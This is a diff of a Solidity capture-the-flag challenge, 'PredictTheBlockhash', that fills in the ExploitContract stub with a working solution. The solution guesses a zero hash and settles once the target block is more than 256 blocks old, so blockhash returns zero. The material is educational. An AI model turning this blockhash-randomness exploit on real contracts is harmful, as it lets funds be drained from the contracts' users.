@@ -3,9 +3,9 @@ pragma solidity ^0.8.13;
 
 //Challenge
 contract PredictTheBlockhash {
-    address guesser;
-    bytes32 guess;
-    uint256 settlementBlockNumber;
+    address internal guesser;
+    bytes32 internal guess;
+    uint256 internal settlementBlockNumber;
 
     constructor() payable {
         require(
@@ -48,9 +48,18 @@ contract PredictTheBlockhash {
 contract ExploitContract {
     PredictTheBlockhash public predictTheBlockhash;
 
-    constructor(PredictTheBlockhash _predictTheBlockhash) {
+constructor(PredictTheBlockhash _predictTheBlockhash) {
         predictTheBlockhash = _predictTheBlockhash;
     }
 
-    // write your exploit code below
+    function guess() public {
+        predictTheBlockhash.lockInGuess{value: 1 ether}( bytes32(0));
+    }
+
+    function settle() public {
+        require(block.number > 257, "Requires block.number to be more than 256");
+        predictTheBlockhash.settle();
+    }
+
+    receive() external payable {}
 }
